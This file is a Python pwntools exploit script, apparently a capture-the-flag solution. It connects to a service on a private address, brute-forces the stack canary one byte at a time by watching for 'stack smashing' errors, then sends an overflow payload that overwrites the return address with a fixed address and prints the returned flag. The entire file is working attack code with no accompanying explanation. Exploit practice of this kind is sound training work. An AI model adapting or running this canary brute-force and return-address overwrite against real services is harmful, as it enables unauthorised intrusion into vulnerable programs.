#!/usr/bin/env python3

from pwn import *
import time
import struct

PADDING = 8
canary = [0x00]
ret = p64(0x4012b6)
#r = remote("10.2.0.48" ,1231)
r = remote("172.17.0.2" ,22334)
#r = remote("localhost" ,17381)
r.send("-1\n") 
for cb in range(7):

    currentByte = 0x00
    for i in range(255):
        text = r.recvuntil(b'Butter')
        print ("[+] Trying %s (Byte #%d)..." % (hex(currentByte), cb + 2))
        DATA =  b""
        DATA += b"A" * PADDING
        DATA += b"".join([struct.pack("B", c) for c in canary])
        DATA += struct.pack("B", currentByte)
        r.clean()
        r.send(DATA)

        received = ""
        try:
            received = r.recvuntil(b"is ready!")
        except EOFError:
            print ("Process Died")

        if b"stack smashing" not in received:
            canary.append(currentByte)
            print ("\n[*] Byte #%d is %s\n" % (cb + 2, hex(currentByte)))
            currentByte = 0
            break
        else:
  #          print("StackSmashed")
  #           print(received)
            currentByte += 1

print ("Found Canary:")
print (" ".join([hex(c) for c in canary]))

sleep(5)
text = r.recvuntil(b'Butter.\n')
print(text)
exp_str =b""
exp_str += b"A"*8 + b"".join([struct.pack("B",c) for c in canary])+b"\x00"*8+ret
r.send(exp_str)
print("Sent Exploit String")
flag=""
flag=r.recvuntil("Butter.\n")
print("flag is:")
print(flag)

r.send(exp_str)

print(r.recvuntil('\n'))
print(r.recvuntil('\n'))
print(r.recvuntil('\n'))
print(r.recvuntil('\n'))
